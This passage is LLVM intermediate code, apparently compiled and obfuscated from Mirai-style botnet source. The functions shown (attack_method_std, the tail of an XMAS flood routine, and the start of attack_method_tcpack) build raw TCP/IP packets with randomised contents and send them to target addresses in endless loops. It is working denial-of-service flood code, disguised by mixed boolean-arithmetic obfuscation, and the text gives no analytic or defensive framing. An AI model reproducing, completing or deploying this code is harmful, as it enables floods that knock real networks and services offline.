  %496 = xor i32 65535, -1
  %497 = xor i32 331152342, -1
  %498 = or i32 %495, %496
  %499 = or i32 331152342, %497
  %500 = xor i32 %498, -1
  %501 = and i32 %500, %499
  %502 = and i32 %494, 65535
  %503 = trunc i32 %501 to i16
  %504 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %505 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %504, i32 0, i32 5
  store i16 %503, i16* %505, align 2
  %506 = load i8, i8* %18, align 1
  %507 = sext i8 %506 to i16
  %508 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %509 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %508, i32 0, i32 4
  %510 = load i16, i16* %509, align 4
  %511 = xor i16 %507, -1
  %512 = xor i16 1, -1
  %513 = xor i16 26123, -1
  %514 = or i16 %511, %512
  %515 = or i16 26123, %513
  %516 = xor i16 %514, -1
  %517 = and i16 %516, %515
  %518 = and i16 %507, 1
  %519 = shl i16 %517, 13
  %520 = xor i16 -8193, -1
  %521 = xor i16 %510, %520
  %522 = and i16 %521, %510
  %523 = and i16 %510, -8193
  %524 = xor i16 %522, -1
  %525 = xor i16 %519, -1
  %526 = xor i16 -19532, -1
  %527 = and i16 %524, -19532
  %528 = and i16 %522, %526
  %529 = and i16 %525, -19532
  %530 = and i16 %519, %526
  %531 = or i16 %527, %528
  %532 = or i16 %529, %530
  %533 = xor i16 %531, %532
  %534 = or i16 %524, %525
  %535 = xor i16 %534, -1
  %536 = or i16 -19532, %526
  %537 = and i16 %535, %536
  %538 = or i16 %533, %537
  %539 = or i16 %522, %519
  store i16 %538, i16* %509, align 4
  %540 = load i8, i8* %19, align 1
  %541 = sext i8 %540 to i16
  %542 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %543 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %542, i32 0, i32 4
  %544 = load i16, i16* %543, align 4
  %545 = xor i16 %541, -1
  %546 = xor i16 1, -1
  %547 = xor i16 9620, -1
  %548 = or i16 %545, %546
  %549 = or i16 9620, %547
  %550 = xor i16 %548, -1
  %551 = and i16 %550, %549
  %552 = and i16 %541, 1
  %553 = shl i16 %551, 12
  %554 = xor i16 -4097, -1
  %555 = xor i16 %544, %554
  %556 = and i16 %555, %544
  %557 = and i16 %544, -4097
  %558 = and i16 %556, %553
  %559 = xor i16 %556, %553
  %560 = or i16 %558, %559
  %561 = or i16 %556, %553
  store i16 %560, i16* %543, align 4
  %562 = load i8, i8* %20, align 1
  %563 = sext i8 %562 to i16
  %564 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %565 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %564, i32 0, i32 4
  %566 = load i16, i16* %565, align 4
  %567 = xor i16 1, -1
  %568 = xor i16 %563, %567
  %569 = and i16 %568, %563
  %570 = and i16 %563, 1
  %571 = shl i16 %569, 11
  %572 = xor i16 -2049, -1
  %573 = xor i16 %566, %572
  %574 = and i16 %573, %566
  %575 = and i16 %566, -2049
  %576 = and i16 %574, %571
  %577 = xor i16 %574, %571
  %578 = or i16 %576, %577
  %579 = or i16 %574, %571
  store i16 %578, i16* %565, align 4
  %580 = load i8, i8* %21, align 1
  %581 = sext i8 %580 to i16
  %582 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %583 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %582, i32 0, i32 4
  %584 = load i16, i16* %583, align 4
  %585 = xor i16 %581, -1
  %586 = xor i16 1, -1
  %587 = xor i16 -16699, -1
  %588 = or i16 %585, %586
  %589 = or i16 -16699, %587
  %590 = xor i16 %588, -1
  %591 = and i16 %590, %589
  %592 = and i16 %581, 1
  %593 = shl i16 %591, 10
  %594 = xor i16 -1025, -1
  %595 = xor i16 %584, %594
  %596 = and i16 %595, %584
  %597 = and i16 %584, -1025
  %598 = xor i16 %596, -1
  %599 = xor i16 %593, -1
  %600 = xor i16 26047, -1
  %601 = and i16 %598, 26047
  %602 = and i16 %596, %600
  %603 = and i16 %599, 26047
  %604 = and i16 %593, %600
  %605 = or i16 %601, %602
  %606 = or i16 %603, %604
  %607 = xor i16 %605, %606
  %608 = or i16 %598, %599
  %609 = xor i16 %608, -1
  %610 = or i16 26047, %600
  %611 = and i16 %609, %610
  %612 = or i16 %607, %611
  %613 = or i16 %596, %593
  store i16 %612, i16* %583, align 4
  %614 = load i8, i8* %22, align 1
  %615 = sext i8 %614 to i16
  %616 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %617 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %616, i32 0, i32 4
  %618 = load i16, i16* %617, align 4
  %619 = xor i16 1, -1
  %620 = xor i16 %615, %619
  %621 = and i16 %620, %615
  %622 = and i16 %615, 1
  %623 = shl i16 %621, 9
  %624 = xor i16 %618, -1
  %625 = xor i16 -513, -1
  %626 = xor i16 -30541, -1
  %627 = or i16 %624, %625
  %628 = or i16 -30541, %626
  %629 = xor i16 %627, -1
  %630 = and i16 %629, %628
  %631 = and i16 %618, -513
  %632 = xor i16 %630, -1
  %633 = xor i16 %623, -1
  %634 = xor i16 16797, -1
  %635 = and i16 %632, 16797
  %636 = and i16 %630, %634
  %637 = and i16 %633, 16797
  %638 = and i16 %623, %634
  %639 = or i16 %635, %636
  %640 = or i16 %637, %638
  %641 = xor i16 %639, %640
  %642 = or i16 %632, %633
  %643 = xor i16 %642, -1
  %644 = or i16 16797, %634
  %645 = and i16 %643, %644
  %646 = or i16 %641, %645
  %647 = or i16 %630, %623
  store i16 %646, i16* %617, align 4
  %648 = load i8, i8* %23, align 1
  %649 = sext i8 %648 to i16
  %650 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %651 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %650, i32 0, i32 4
  %652 = load i16, i16* %651, align 4
  %653 = xor i16 1, -1
  %654 = xor i16 %649, %653
  %655 = and i16 %654, %649
  %656 = and i16 %649, 1
  %657 = shl i16 %655, 8
  %658 = xor i16 %652, -1
  %659 = xor i16 -257, -1
  %660 = xor i16 -15567, -1
  %661 = or i16 %658, %659
  %662 = or i16 -15567, %660
  %663 = xor i16 %661, -1
  %664 = and i16 %663, %662
  %665 = and i16 %652, -257
  %666 = xor i16 %664, -1
  %667 = xor i16 %657, -1
  %668 = xor i16 30995, -1
  %669 = and i16 %666, 30995
  %670 = and i16 %664, %668
  %671 = and i16 %667, 30995
  %672 = and i16 %657, %668
  %673 = or i16 %669, %670
  %674 = or i16 %671, %672
  %675 = xor i16 %673, %674
  %676 = or i16 %666, %667
  %677 = xor i16 %676, -1
  %678 = or i16 30995, %668
  %679 = and i16 %677, %678
  %680 = or i16 %675, %679
  %681 = or i16 %664, %657
  store i16 %680, i16* %651, align 4
  %682 = load i8*, i8** %38, align 8
  %683 = load i32, i32* %24, align 4
  call void @rand_str(i8* %682, i32 %683)
  br label %724

; <label>:684:                                    ; preds = %263, %252
  %685 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %686 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %685, i32 0, i32 4
  %687 = load i16, i16* %686, align 4
  %688 = lshr i16 %687, 8
  %689 = xor i16 1, -1
  %690 = xor i16 %688, %689
  %691 = and i16 %690, %688
  %692 = and i16 %688, 1
  %693 = zext i16 %691 to i32
  %694 = icmp ne i32 %693, 0
  br i1 %694, label %706, label %695

; <label>:695:                                    ; preds = %684
  %696 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %697 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %696, i32 0, i32 4
  %698 = load i16, i16* %697, align 4
  %699 = lshr i16 %698, 10
  %700 = xor i16 1, -1
  %701 = xor i16 %699, %700
  %702 = and i16 %701, %699
  %703 = and i16 %699, 1
  %704 = zext i16 %702 to i32
  %705 = icmp ne i32 %704, 0
  br i1 %705, label %706, label %709

; <label>:706:                                    ; preds = %695, %684
  %707 = load i32, i32* %26, align 4
  %708 = call i32 @close(i32 %707)
  br label %121

; <label>:709:                                    ; preds = %695
  br label %710

; <label>:710:                                    ; preds = %709
  br label %711

; <label>:711:                                    ; preds = %710, %240
  br label %712

; <label>:712:                                    ; preds = %711, %236, %228
  %713 = call i64 @time(i64* null) #7
  %714 = load i64, i64* %31, align 8
  %715 = add i64 %713, -411533984546339845
  %716 = sub i64 %715, %714
  %717 = sub i64 %716, -411533984546339845
  %718 = sub nsw i64 %713, %714
  %719 = icmp sgt i64 %717, 10
  br i1 %719, label %720, label %723

; <label>:720:                                    ; preds = %712
  %721 = load i32, i32* %26, align 4
  %722 = call i32 @close(i32 %721)
  br label %121

; <label>:723:                                    ; preds = %712
  br label %216

; <label>:724:                                    ; preds = %399
  br label %725

; <label>:725:                                    ; preds = %724, %124
  %726 = load i32, i32* %9, align 4
  %727 = sub i32 0, %726
  %728 = sub i32 0, 1
  %729 = add i32 %727, %728
  %730 = sub i32 0, %729
  %731 = add nsw i32 %726, 1
  store i32 %730, i32* %9, align 4
  br label %115

; <label>:732:                                    ; preds = %115
  br label %733

; <label>:733:                                    ; preds = %860, %732
  store i32 0, i32* %9, align 4
  br label %734

; <label>:734:                                    ; preds = %854, %733
  %735 = load i32, i32* %9, align 4
  %736 = load i8, i8* %5, align 1
  %737 = zext i8 %736 to i32
  %738 = icmp slt i32 %735, %737
  br i1 %738, label %739, label %860

; <label>:739:                                    ; preds = %734
  %740 = load i8**, i8*** %12, align 8
  %741 = load i32, i32* %9, align 4
  %742 = sext i32 %741 to i64
  %743 = getelementptr inbounds i8*, i8** %740, i64 %742
  %744 = load i8*, i8** %743, align 8
  store i8* %744, i8** %39, align 8
  %745 = load i8*, i8** %39, align 8
  %746 = bitcast i8* %745 to %struct.iphdr*
  store %struct.iphdr* %746, %struct.iphdr** %40, align 8
  %747 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %748 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %747, i64 1
  %749 = bitcast %struct.iphdr* %748 to %struct.tcphdr*
  store %struct.tcphdr* %749, %struct.tcphdr** %41, align 8
  %750 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %751 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %750, i64 1
  %752 = bitcast %struct.tcphdr* %751 to i8*
  store i8* %752, i8** %42, align 8
  %753 = load i16, i16* %14, align 2
  %754 = zext i16 %753 to i32
  %755 = icmp eq i32 %754, 65535
  br i1 %755, label %756, label %765

; <label>:756:                                    ; preds = %739
  %757 = call i32 @rand_next()
  %758 = xor i32 65535, -1
  %759 = xor i32 %757, %758
  %760 = and i32 %759, %757
  %761 = and i32 %757, 65535
  %762 = trunc i32 %760 to i16
  %763 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %764 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %763, i32 0, i32 3
  store i16 %762, i16* %764, align 4
  br label %765

; <label>:765:                                    ; preds = %756, %739
  %766 = load i8, i8* %25, align 1
  %767 = icmp ne i8 %766, 0
  br i1 %767, label %768, label %771

; <label>:768:                                    ; preds = %765
  %769 = load i8*, i8** %42, align 8
  %770 = load i32, i32* %24, align 4
  call void @rand_str(i8* %769, i32 %770)
  br label %771

; <label>:771:                                    ; preds = %768, %765
  %772 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %773 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %772, i32 0, i32 7
  store i16 0, i16* %773, align 2
  %774 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %775 = bitcast %struct.iphdr* %774 to i16*
  %776 = call zeroext i16 @checksum_generic(i16* %775, i32 20)
  %777 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %778 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %777, i32 0, i32 7
  store i16 %776, i16* %778, align 2
  %779 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %780 = load i32, i32* %9, align 4
  %781 = sext i32 %780 to i64
  %782 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %779, i64 %781
  %783 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %782, i32 0, i32 1
  %784 = load i32, i32* %783, align 4
  %785 = sub i32 %784, 1683134938
  %786 = add i32 %785, 1
  %787 = add i32 %786, 1683134938
  %788 = add i32 %784, 1
  store i32 %787, i32* %783, align 4
  %789 = trunc i32 %784 to i16
  %790 = call zeroext i16 @htons(i16 zeroext %789) #8
  %791 = zext i16 %790 to i32
  %792 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %793 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %792, i32 0, i32 2
  store i32 %791, i32* %793, align 4
  %794 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %795 = load i32, i32* %9, align 4
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %794, i64 %796
  %798 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %797, i32 0, i32 2
  %799 = load i32, i32* %798, align 4
  %800 = trunc i32 %799 to i16
  %801 = call zeroext i16 @htons(i16 zeroext %800) #8
  %802 = zext i16 %801 to i32
  %803 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %804 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %803, i32 0, i32 3
  store i32 %802, i32* %804, align 4
  %805 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %806 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %805, i32 0, i32 6
  store i16 0, i16* %806, align 4
  %807 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %808 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %809 = bitcast %struct.tcphdr* %808 to i8*
  %810 = load i32, i32* %24, align 4
  %811 = sext i32 %810 to i64
  %812 = add i64 20, -5341490820766196520
  %813 = add i64 %812, %811
  %814 = sub i64 %813, -5341490820766196520
  %815 = add i64 20, %811
  %816 = trunc i64 %814 to i16
  %817 = call zeroext i16 @htons(i16 zeroext %816) #8
  %818 = load i32, i32* %24, align 4
  %819 = sext i32 %818 to i64
  %820 = sub i64 0, %819
  %821 = sub i64 20, %820
  %822 = add i64 20, %819
  %823 = trunc i64 %821 to i32
  %824 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %807, i8* %809, i16 zeroext %817, i32 %823)
  %825 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %826 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %825, i32 0, i32 6
  store i16 %824, i16* %826, align 4
  %827 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %828 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %827, i32 0, i32 1
  %829 = load i16, i16* %828, align 2
  %830 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %831 = load i32, i32* %9, align 4
  %832 = sext i32 %831 to i64
  %833 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %830, i64 %832
  %834 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %833, i32 0, i32 0
  %835 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %834, i32 0, i32 1
  store i16 %829, i16* %835, align 2
  %836 = load i32, i32* %10, align 4
  %837 = load i8*, i8** %39, align 8
  %838 = load i32, i32* %24, align 4
  %839 = sext i32 %838 to i64
  %840 = add i64 40, -4547509732936063453
  %841 = add i64 %840, %839
  %842 = sub i64 %841, -4547509732936063453
  %843 = add i64 40, %839
  %844 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %845 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %846 = load i32, i32* %9, align 4
  %847 = sext i32 %846 to i64
  %848 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %845, i64 %847
  %849 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %848, i32 0, i32 0
  %850 = bitcast %struct.sockaddr_in* %849 to %struct.sockaddr*
  store %struct.sockaddr* %850, %struct.sockaddr** %844, align 8
  %851 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %852 = load %struct.sockaddr*, %struct.sockaddr** %851, align 8
  %853 = call i64 @sendto(i32 %836, i8* %837, i64 %842, i32 16384, %struct.sockaddr* %852, i32 16)
  br label %854

; <label>:854:                                    ; preds = %771
  %855 = load i32, i32* %9, align 4
  %856 = add i32 %855, -107421790
  %857 = add i32 %856, 1
  %858 = sub i32 %857, -107421790
  %859 = add nsw i32 %855, 1
  store i32 %858, i32* %9, align 4
  br label %734

; <label>:860:                                    ; preds = %734
  br label %733

; <label>:861:                                    ; preds = %227, %111, %105
  ret void
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #3

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_std(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #7
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #7
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 1024)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #8
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %173, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %179

; <label>:63:                                     ; preds = %58
  %64 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

; <label>:72:                                     ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

; <label>:81:                                     ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %82) #8
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

; <label>:90:                                     ; preds = %81, %72
  %91 = call i32 @socket(i32 2, i32 2, i32 0) #7
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %90
  ret void

; <label>:98:                                     ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 %108, %struct.sockaddr* %112, i32 16) #7
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %98
  br label %116

; <label>:116:                                    ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %154

; <label>:125:                                    ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 %131) #8
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = add i32 %132, 1500362840
  %143 = add i32 %142, %141
  %144 = sub i32 %143, 1500362840
  %145 = add i32 %132, %141
  %146 = call i32 @htonl(i32 %144) #8
  %147 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i64 %149
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i32 0, i32 0
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %151, i32 0, i32 2
  %153 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %152, i32 0, i32 0
  store i32 %146, i32* %153, align 4
  br label %154

; <label>:154:                                    ; preds = %125, %116
  %155 = load i32*, i32** %11, align 8
  %156 = load i32, i32* %9, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds i32, i32* %155, i64 %157
  %159 = load i32, i32* %158, align 4
  %160 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %161 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %162 = load i32, i32* %9, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i64 %163
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i32 0, i32 0
  %166 = bitcast %struct.sockaddr_in* %165 to %struct.sockaddr*
  store %struct.sockaddr* %166, %struct.sockaddr** %160, align 8
  %167 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %168 = load %struct.sockaddr*, %struct.sockaddr** %167, align 8
  %169 = call i32 @connect(i32 %159, %struct.sockaddr* %168, i32 16)
  %170 = icmp eq i32 %169, -1
  br i1 %170, label %171, label %172

; <label>:171:                                    ; preds = %154
  br label %172

; <label>:172:                                    ; preds = %171, %154
  br label %173

; <label>:173:                                    ; preds = %172
  %174 = load i32, i32* %9, align 4
  %175 = sub i32 %174, -505829494
  %176 = add i32 %175, 1
  %177 = add i32 %176, -505829494
  %178 = add nsw i32 %174, 1
  store i32 %177, i32* %9, align 4
  br label %58

; <label>:179:                                    ; preds = %58
  br label %180

; <label>:180:                                    ; preds = %213, %179
  store i32 0, i32* %9, align 4
  br label %181

; <label>:181:                                    ; preds = %208, %180
  %182 = load i32, i32* %9, align 4
  %183 = load i8, i8* %5, align 1
  %184 = zext i8 %183 to i32
  %185 = icmp slt i32 %182, %184
  br i1 %185, label %186, label %213

; <label>:186:                                    ; preds = %181
  %187 = load i8**, i8*** %10, align 8
  %188 = load i32, i32* %9, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds i8*, i8** %187, i64 %189
  %191 = load i8*, i8** %190, align 8
  store i8* %191, i8** %22, align 8
  %192 = load i8, i8* %15, align 1
  %193 = icmp ne i8 %192, 0
  br i1 %193, label %194, label %198

; <label>:194:                                    ; preds = %186
  %195 = load i8*, i8** %22, align 8
  %196 = load i16, i16* %14, align 2
  %197 = zext i16 %196 to i32
  call void @rand_str(i8* %195, i32 %197)
  br label %198

; <label>:198:                                    ; preds = %194, %186
  %199 = load i32*, i32** %11, align 8
  %200 = load i32, i32* %9, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds i32, i32* %199, i64 %201
  %203 = load i32, i32* %202, align 4
  %204 = load i8*, i8** %22, align 8
  %205 = load i16, i16* %14, align 2
  %206 = zext i16 %205 to i64
  %207 = call i64 @send(i32 %203, i8* %204, i64 %206, i32 16384)
  br label %208

; <label>:208:                                    ; preds = %198
  %209 = load i32, i32* %9, align 4
  %210 = sub i32 0, 1
  %211 = sub i32 %209, %210
  %212 = add nsw i32 %209, 1
  store i32 %211, i32* %9, align 4
  br label %181

; <label>:213:                                    ; preds = %181
  br label %180
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
